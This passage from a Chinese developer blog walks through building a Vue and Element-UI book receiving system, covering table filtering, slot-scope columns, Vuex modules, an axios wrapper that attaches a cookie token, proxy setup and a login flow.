this.bookData = this.bookData.filter((book) =&gt; &#123;</span><br><span class="line">        return book.name == this.name;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; else if (num == 1 &amp;&amp; item != &quot;&quot;) &#123;</span><br><span class="line">      this.bookData = this.bookData.filter((book) =&gt; &#123;</span><br><span class="line">        return book.bookName == this.bookName;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; else if (num == 2 &amp;&amp; item != &quot;&quot;) &#123;</span><br><span class="line">      this.bookData = this.bookData.filter((book) =&gt; &#123;</span><br><span class="line">        return book.period == this.period;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; else if (num == 3 &amp;&amp; item != &quot;&quot;) &#123;</span><br><span class="line">      this.bookData = this.bookData.filter((book) =&gt; &#123;</span><br><span class="line">        return book.statment == this.statment;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h4 id="2-1-1-关于el-input框的clearable属性"><a href="#2-1-1-关于el-input框的clearable属性" class="headerlink" title="2.1.1 关于el-input框的clearable属性"></a>2.1.1 关于el-input框的clearable属性</h4><p>我们这里的input输入是使用的element的el-input，而el-input有一个可清除选项，也就是加入一个clearable属性</p><p>但是直接加入clearable属性会出现 清除按钮样式错误的问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//直接加入clearable选项</span><br><span class="line">        &lt;el-input</span><br><span class="line">          v-model=&quot;statment&quot;</span><br><span class="line">          placeholder=&quot;取件状态&quot;</span><br><span class="line">          id=&quot;u44-2&quot;</span><br><span class="line">          clearable</span><br><span class="line">        &gt;</span><br><span class="line">        &lt;/el-input&gt;</span><br></pre></td></tr></table></figure><p>为了解决这个问题，我们需要将left，top，width，height有关的属性使用<strong>style属性写在标签中</strong>，同时还需要将原来写在css文件中的有关样式删除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//修改后的写法</span><br><span class="line">        &lt;el-input</span><br><span class="line">          v-model=&quot;statment&quot;</span><br><span class="line">          placeholder=&quot;取件状态&quot;</span><br><span class="line">          id=&quot;u44-2&quot;</span><br><span class="line">          style=&quot;top: -1px; width: 200px;left: 556px&quot;</span><br><span class="line">          clearable</span><br><span class="line">        &gt;</span><br><span class="line">        &lt;/el-input&gt;</span><br></pre></td></tr></table></figure><p>这样我们的clear按钮就不会乱窜了</p><h4 id="2-1-2-模糊查找"><a href="#2-1-2-模糊查找" class="headerlink" title="2.1.2 模糊查找"></a>2.1.2 模糊查找</h4><p>我这里的模糊查找需求比较简单，如果想搜索 中国戏剧，那我们就只用搜索<code>中国</code>，<code>中国戏</code>之类的就可以了</p><p>这里主要是用到了一个函数<code>include(parmas)</code>，parmas就是我们输入的搜索字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">else if (num == 1 &amp;&amp; item != &quot;&quot;) &#123;</span><br><span class="line">storeManage.state.bookData = storeManage.state.bookData.filter((book) =&gt; &#123;</span><br><span class="line">return book.bookName.includes(state.bookName)</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h3 id="2-2修改功能"><a href="#2-2修改功能" class="headerlink" title="2.2修改功能"></a>2.2修改功能</h3><p>这里的修改是修改书籍的状态，因为书籍状态只有固定的两种，所以我就使用的select下拉框</p><p>同样通过插槽写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-table-column prop=&quot;statment&quot; label=&quot;状态&quot; width=&quot;75&quot;&gt;</span><br><span class="line">   &lt;!-- 插槽处理状态下拉栏 --&gt;</span><br><span class="line">   &lt;template slot-scope=&quot;scope&quot;&gt;</span><br><span class="line">     &lt;select name= &quot;取件状态&quot; type=&quot;text&quot; v-show=&quot;scope.row.iseditor&quot; v-model=&quot;scope.row.statment&quot;&gt;</span><br><span class="line">       &lt;option value=&quot;已取&quot;&gt;已取&lt;/option&gt;</span><br><span class="line">       &lt;option value=&quot;未取&quot;&gt;未取&lt;/option&gt;</span><br><span class="line">     &lt;/select&gt;</span><br><span class="line">     &lt;span v-show=&quot;!scope.row.iseditor&quot;&gt;&#123;&#123; scope.row.statment &#125;&#125;&lt;/span&gt;</span><br><span class="line">   &lt;/template&gt;</span><br><span class="line"> &lt;/el-table-column&gt;</span><br></pre></td></tr></table></figure><p>主要是后面的<code>button</code>，肯定不能安装插槽来写（会因为template显示不出来），但是csdn的时候发现使用 <code>#default = &quot;scope&quot;</code>可以显示该模板而且获取到了scope，得到了scope也就是得到了每一行的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-table-column&gt;</span><br><span class="line">  &lt;template #default=&quot;scope&quot;&gt;</span><br><span class="line">  &lt;button @click=&quot;change(scope.row)&quot;&gt;&#123;&#123;scope.row.iseditor ? &quot;保存&quot;:&quot;更改&quot;&#125;&#125;&lt;/button&gt;</span><br><span class="line">  &lt;/template&gt;</span><br><span class="line">&lt;/el-table-column&gt;</span><br></pre></td></tr></table></figure><h4 id="2-2-1-关于scope自定义列表格"><a href="#2-2-1-关于scope自定义列表格" class="headerlink" title="2.2.1 关于scope自定义列表格"></a>2.2.1 关于scope自定义列表格</h4><p>这里的<code>#default = &quot;scope&quot;</code>其实是<code>v-slot = &quot;scope&quot;</code>的简写，而这个是element-plus中自定义列表格的用法</p><p>其实这种用法上一个页面就使用过</p><p>element中自定义类表格的便是使用的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;template slot-scope=&quot;scope&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><p>而这个scope我们打印一下</p><p><img src="https://s2.loli.net/2022/07/31/ytu8cqa6SKQfodj.png" alt="scope.png"></p><p>其实就是我们的vc，下面有我们的row属性，可以拿到每一行的数据</p><p>而在element-plus中我们的自定义列表格写成 <code>#defalut = &quot;scope&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;template #default=&quot;scope&quot;&gt;</span><br><span class="line">  </span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><p>这两个就是一个版本的区别，在我的实际开发中都可以得到相同的效果</p><h2 id="3-查看订阅系统页面"><a href="#3-查看订阅系统页面" class="headerlink" title="3.查看订阅系统页面"></a>3.查看订阅系统页面</h2><p>这个页面和仓库管理页面非常相似</p><p><img src="https://s2.loli.net/2022/07/31/eSYkHIhXjlKc87d.png" alt="订阅系统页面.png"></p><p>也就代表我们可以复用的组件有很多</p><p>这里我主要是复用了筛选框组件，但是虽然说是复用 其实还是有一点差别的</p><h3 id="1-第一就是筛选条件"><a href="#1-第一就是筛选条件" class="headerlink" title="1.第一就是筛选条件"></a>1.第一就是筛选条件</h3><p>仓库页面的筛选条件有4条，这个页面的筛选条件是3条</p><p>使用我们需要判断，这个组件究竟是用在了仓库页面还是订阅系统页面，判断条件交由<code>v-show</code></p><p>进行这个判断我们第一个想到的就是父组件向子组件传值—<code>props</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  //订阅系统组件</span><br><span class="line">  &lt;filterMid :flag=&quot;flag&quot;&gt;&lt;/filterMid&gt;</span><br><span class="line">  </span><br><span class="line">  // 数据 </span><br><span class="line"> data() &#123;</span><br><span class="line">  return &#123;</span><br><span class="line">    //其他数据已放入vuex</span><br><span class="line">    flag: 0,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>然后使用v-show进行一个简单的显示与隐藏</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//取件状态栏</span><br><span class="line">&lt;span id=&quot;u102-2&quot; v-show=&quot;flag&quot;&gt;取件状态：&lt;/span&gt;</span><br><span class="line">&lt;el-input</span><br><span class="line">  v-show=&quot;flag&quot;</span><br><span class="line">  v-model=&quot;$store.state.statment&quot;</span><br><span class="line">  placeholder=&quot;取件状态&quot;</span><br><span class="line">  id=&quot;u44-2&quot;</span><br><span class="line">  style=&quot;top: -1px; width: 200px; left: 536px&quot;</span><br><span class="line">  clearable</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><h3 id="2-第二就是用于筛选的数据"><a href="#2-第二就是用于筛选的数据" class="headerlink" title="2.第二就是用于筛选的数据"></a>2.第二就是用于筛选的数据</h3><p>因为数据放在vuex中，因为我们需要考虑能不能筛选框在两个组件中都使用同一组数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v-model=&quot;$store.state.name&quot;</span><br><span class="line">v-model=&quot;$store.state.bookName&quot;</span><br><span class="line">v-model=&quot;$store.state.period&quot;</span><br></pre></td></tr></table></figure><p>但是这个就必然会有一定的问题，首先是异步性</p><p>仓库页面写入的筛选条件会显示在订阅系统的页面上</p><p>为了避免异步我们可以不使用同一组数据</p><p>但是面临的问题就是数据绑定怎么做</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">v-model=&quot;name&quot;</span><br><span class="line"></span><br><span class="line">data()&#123;</span><br><span class="line">return&#123;</span><br><span class="line">name:&#x27;&#x27;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">watch:&#123;</span><br><span class="line">//name需要随flag的变化在name（仓库的筛选）和sub_name（订阅系统的筛选）中切换</span><br><span class="line">//还需要做出一个双向绑定，解决数据交互的问题，this.name改变需要通知state.name || state.sub_name</span><br><span class="line">  state.name || state.sub_name 改变也需要通知 this.name</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>这样虽然更改准确，但是代码量大大增加</p><p>于是我偷了一个小懒，实际上这里的异步并不会让客户知道，因为客户在一个时间只会看一个页面</p><p>所以，在订阅或者仓库页面切换的时候，我们只需要清空筛选条件就可以了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//仓库组件</span><br><span class="line">  mounted() &#123;</span><br><span class="line">    //页面切换数据置空</span><br><span class="line">    this.$store.state.name = &quot;&quot;;</span><br><span class="line">    this.$store.state.bookName = &quot;&quot;;</span><br><span class="line">    this.$store.state.period = &quot;&quot;;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">//订阅组件同理</span><br></pre></td></tr></table></figure><h3 id="3-第三是用于筛选的数据"><a href="#3-第三是用于筛选的数据" class="headerlink" title="3.第三是用于筛选的数据"></a>3.第三是用于筛选的数据</h3><p>因为过滤器的原因我们组件需要一个副本数组<code>subarr</code>，但是在组件复用之后我们需要对<code>subarr</code>中的内容进行切换</p><p>在仓库组件中<code>subarr</code>是仓库数据<code>bookData</code>的副本</p><p>在订阅组件中<code>subarr</code>是订阅数据<code>bookList</code>的副本</p><p>所以这里使用watch进行一个监视</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">watch: &#123;</span><br><span class="line">  Flag: &#123;</span><br><span class="line">    immediate: true,</span><br><span class="line">    handler() &#123;</span><br><span class="line">      //监视Flag，Flag改变时改变subarr数组,name,bookName,period</span><br><span class="line">      this.subarr = this.Flag</span><br><span class="line">        ? this.$store.state.bookData</span><br><span class="line">        : this.$store.state.bookList;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;,</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>及时的切换我们的数据</p><h2 id="4-密码申诉页面"><a href="#4-密码申诉页面" class="headerlink" title="4.密码申诉页面"></a>4.密码申诉页面</h2><p>这个页面主要用于处理用户提交的密码申诉</p><p><img src="https://s2.loli.net/2022/07/31/8YNkPDO3Gt7M9TL.png" alt="密码申诉页面.png"></p><p>一如既往的查找，同意or拒绝，还有全选同意和拒绝</p><p>首先我们需要控制凭证图片的大小，通过<code>:src</code>拿到每一行的图片地址，再通过<code>style</code>属性修改图片的高宽，通过<code>:preview-src-list</code>设置点击图片后的展示效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-table-column prop=&quot;img&quot; label=&quot;凭证&quot; width=&quot;450&quot;&gt;</span><br><span class="line">  &lt;template slot-scope=&quot;scope&quot;&gt;</span><br><span class="line">    &lt;el-image</span><br><span class="line">      style=&quot;width: 50%; height: 150px&quot;</span><br><span class="line">      :src=&quot;scope.row.img&quot;</span><br><span class="line">      :preview-src-list=&quot;[scope.row.img]&quot;</span><br><span class="line">      :key=&quot;scope.row.num&quot;</span><br><span class="line">    &gt;</span><br><span class="line">      &lt;div slot=&quot;error&quot; class=&quot;image-slot&quot;&gt;</span><br><span class="line">        &lt;i class=&quot;el-icon-picture-outline&quot;&gt;&lt;/i&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/el-image&gt;</span><br><span class="line">  &lt;/template&gt;</span><br><span class="line">&lt;/el-table-column&gt;</span><br></pre></td></tr></table></figure><p>同意和拒绝绑定改变条目的审核状态</p><p>点击全选时，隐藏同意和拒绝两个按钮，待处理条目出现一个checkbox代表被勾选</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sleAll() &#123;</span><br><span class="line">  if (this.checked == true) &#123;</span><br><span class="line">    //点击开启全选</span><br><span class="line">    this.$store.state.pwdList.forEach((item) =&gt; &#123;</span><br><span class="line">      item.checked = true;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    //点击关闭全选</span><br><span class="line">    this.$store.state.pwdList.forEach((item) =&gt; &#123;</span><br><span class="line">      item.checked = false;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>所以这里的<code>v-show</code>的隐藏条件就需要考虑一下，按钮需要在待取件状态和没有打开全选的状态下才显示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-button</span><br><span class="line">  @click=&quot;agree(scope.row)&quot;</span><br><span class="line">  v-show=&quot;scope.row.pwd_Statement == &#x27;待处理&#x27; &amp;&amp; !scope.row.checked&quot;</span><br><span class="line">  &gt;同意&lt;/el-button&gt;</span><br></pre></td></tr></table></figure><p>同样，勾选框就需要在打开全选和状态为待处理的情况下显示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v-show=&quot;scope.row.checked &amp;&amp; scope.row.pwd_Statement == &#x27;待处理&#x27;&quot;</span><br></pre></td></tr></table></figure><h2 id="5-vuex的模块化"><a href="#5-vuex的模块化" class="headerlink" title="5.vuex的模块化"></a>5.vuex的模块化</h2><p>到现在为止我们vuex的数据都是放在一块的，这样子显得数据十分冗杂，所以我们现在将vuex的数据按照组件进行分类</p><p> 将对应的函数和数据放入store中新建的文件中</p><p><img src="D:\新建文件夹\文件\GitHub\pic\收发系统开发日志\vuex模块化.png" alt="vuex模块化"></p><p>然后在<code>index.js</code>中引入各个vuex模块并暴露出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import userManage from &#x27;./userManage&#x27;</span><br><span class="line">import storeManage from &#x27;./storeManage&#x27;</span><br><span class="line"></span><br><span class="line">export default new Vuex.Store(&#123;</span><br><span class="line">    actions,</span><br><span class="line">    mutations,</span><br><span class="line">    state,</span><br><span class="line">    getters,</span><br><span class="line">    modules: &#123; userManage, storeManage &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>此时如果要引用各个vuex模块中的数据，就需要加上<code>modules</code>的名字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:data=&quot;$store.state.storeManage.bookData&quot;</span><br></pre></td></tr></table></figure><h3 id="1-模块数据的署名问题"><a href="#1-模块数据的署名问题" class="headerlink" title="1.模块数据的署名问题"></a>1.模块数据的署名问题</h3><p>这里在组件中原来绑定的<code>state.bookData</code>现在就需要改为<code>state.storeManage.bookData</code></p><p>而在store中的index.js中如果需要使用bookData，我们就需要改为<code>storeManage.bookData</code></p><p>因为vuex模块化在组件使用的时候是帮我们做了一个集成的操作，此时所有模块的数据都放在了state下，依靠模块名进行分类</p><p>而在index.js中还没有集成，获取数据是依靠引入的模块，所以需要先写下是什么模块下的数据</p><h2 id="6-request"><a href="#6-request" class="headerlink" title="6.request"></a>6.request</h2><h3 id="1-配置文件"><a href="#1-配置文件" class="headerlink" title="1.配置文件"></a>1.配置文件</h3><p>我们向后端发送请求可以通过request进行</p><p>在src下新建一个api文件夹</p><p><img src="https://s2.loli.net/2022/07/31/hrb7zGi5uXTCKWA.png" alt="request.png"></p><p>在index.js文件夹中写入，主要是用于发送请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//当前模块对所有接口进行统一管理</span><br><span class="line">import requests from &quot;./request&quot;;</span><br><span class="line"></span><br><span class="line">//管理员登录接口</span><br><span class="line">///admin/login post admin</span><br><span class="line"></span><br><span class="line">//post请求</span><br><span class="line">export const reqUserLogin = (data) =&gt; requests(&#123;url:&#x27; /user/findAllUser&#x27;,method:&#x27;post&#x27;,data&#125;)</span><br><span class="line">//get请求，传递params参数</span><br><span class="line">export const getUserList = (params) =&gt; requests(&#123;url:&#x27;/user/findAllUser&#x27;,method:&#x27;get&#x27;,params&#125;)</span><br></pre></td></tr></table></figure><p>在request.js文件中写入，用于封装axios，添加拦截器，修改请求头（添加token），token存在了store和cookie中，这里从cookie中拿token，之前在store拿有问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import Cookies from &quot;js-cookie&quot;;</span><br><span class="line">import axios from &quot;axios&quot;;</span><br><span class="line">//axios的封装</span><br><span class="line">const requests = axios.create(&#123;</span><br><span class="line">    baseURL:&#x27;&#x27;,</span><br><span class="line">    timeout:5000</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">requests.interceptors.request.use((config)=&gt;&#123;</span><br><span class="line">    if(Cookies.get(&#x27;token&#x27;))&#123;</span><br><span class="line">        //请求头添加字段</span><br><span class="line">        config.headers.Token = Cookies.get(&#x27;token&#x27;)</span><br><span class="line">    &#125;</span><br><span class="line">    return config;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">requests.interceptors.response.use((res)=&gt;&#123;</span><br><span class="line">    return res.data;</span><br><span class="line">&#125;,(error)=&gt;&#123;</span><br><span class="line">    return Promise.reject(new Error(&#x27;failed&#x27;))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">export default requests;</span><br></pre></td></tr></table></figure><p>然后我们需要在<code>vue.config.js</code>中配置跨域问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">//vue.config.js</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">    //关闭eslint校验工具</span><br><span class="line">    lintOnSave: false,</span><br><span class="line">    publicPath: &quot;/&quot;,</span><br><span class="line">    devServer: &#123;</span><br><span class="line">        proxy: &#123;</span><br><span class="line">            //配置跨域           </span><br><span class="line">            &#x27;&#x27;: &#123;</span><br><span class="line">                target: &#x27;服务器地址&#x27;, //这里后台的地址模拟的;应该填写你们真实的后台接口            </span><br><span class="line">                changOrigin: true, //允许跨域            </span><br><span class="line">                pathRewrite: &#123;</span><br><span class="line">                    /* 重写路径，当我们在浏览器中看到请求的地址   为：          http://localhost:8080/api/core/getData/userInfo 时           </span><br><span class="line">                    实际上访问的地址是：</span><br><span class="line">                    http://121.121.67.254:8185/core/getData/userInfo,因为重写了 /api           */</span><br><span class="line">                    &#x27;&#x27;: &#x27;&#x27;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-请求函数"><a href="#2-请求函数" class="headerlink" title="2.请求函数"></a>2.请求函数</h3><p>那么我们需要发送请求时需要在函数前面添加<code>async</code>进行一个<code>promise</code>封装</p><p>发送请求的四种类型：<code>put</code>,<code>delete</code>,<code>post</code>,<code>get</code>对应了<strong>增删改查</strong>四个操作</p><p><code>let result = await reqUserLogin(data)</code> 主要是得到返回的数据</p><p>在有返回成功后code==200，再进行commit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">async userLogin(&#123;commit&#125;,data)&#123;</span><br><span class="line">    let result = await reqUserLogin(data)//data是需要上传的参数</span><br><span class="line">    //服务器下发token</span><br><span class="line">    if(result.code == 200)&#123;</span><br><span class="line">        commit(&quot;USERLOGIN&quot;,result.data.token);</span><br><span class="line">        Cookie.set(&#x27;token&#x27;, result.data.token) // 第一个是cookie的名称，第二个是传入的值。然后再Cookie中生成了一条数据。</span><br><span class="line">        return &#x27;ok&#x27;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return Promise.reject(new Error(&#x27;failed&#x27;))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-登录页面"><a href="#3-登录页面" class="headerlink" title="3.登录页面"></a>3.登录页面</h3><p>比如运用以上内容我们可以做一个登录页面，在await之后<code>router.push</code>跳转至下一个页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//登录的回调函数</span><br><span class="line">async userLogin()&#123;</span><br><span class="line">    try&#123;</span><br><span class="line">        const &#123;form&#125; = this</span><br><span class="line">        form &amp;&amp; await this.$store.dispatch(&#x27;userLogin&#x27;,form)</span><br><span class="line">        this.$router.push(&#123;</span><br><span class="line">            name:&#x27;home&#x27;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;catch(error)&#123;</span><br><span class="line">        alert(error.message)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-token"><a href="#7-token" class="headerlink" title="7.token"></a>7.token</h2><p> 关于前后端交互的一个内容，众所周知，当我们的需要数据或者提交数据的时候，需要发送一个请求，而token就是请求中需要添加的一个字段</p><h3 id="1-什么是token"><a href="#1-什么是token" class="headerlink" title="1.什么是token"></a>1.什么是token</h3><p>token的意思是“令牌”，是服务端生成的一串字符串，作为客户端进行请求的一个标识。</p><p>当用户第一次登录后，服务器生成一个token并将此token返回给客户端，以后客户端只需带上这个token前来请求数据即可，无需再次带上用户名和密码。</p><p>简单token的组成；uid(用户唯一的身份标识)、time(当前时间的时间戳)、sign（签名，token的前几位以哈希算法压缩成的一定长度的十六进制字符串。为防止token泄露）。</p><h3 id="2-如何使用token"><a href="#2-如何使用token" class="headerlink" title="2.如何使用token"></a>2.如何使用token</h3><p>我这里将token放在了vuex中，如何将vuex中的token放入Cookie，Cookie中的数据会随请求发个服务器</p><p>操作cookie中的数据就依靠<code>cookie.get/remove/set</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">//接口文件中的请求</span><br><span class="line">export const reqUserLogin = (data) =&gt; requests(&#123;url:&#x27;/user/findAllUser&#x27;,method:&#x27;post&#x27;,data&#125;)</span><br><span class="line"></span><br><span class="line">// 引入下载的第三方库</span><br><span class="line">import Cookie from &quot;js-cookie&quot;</span><br><span class="line"></span><br><span class="line">    state:&#123;</span><br><span class="line">        token:&#x27;&#x27;,</span><br><span class="line">    &#125;,</span><br><span class="line">    mutations:&#123;</span><br><span class="line">        //设置token</span><br><span class="line">        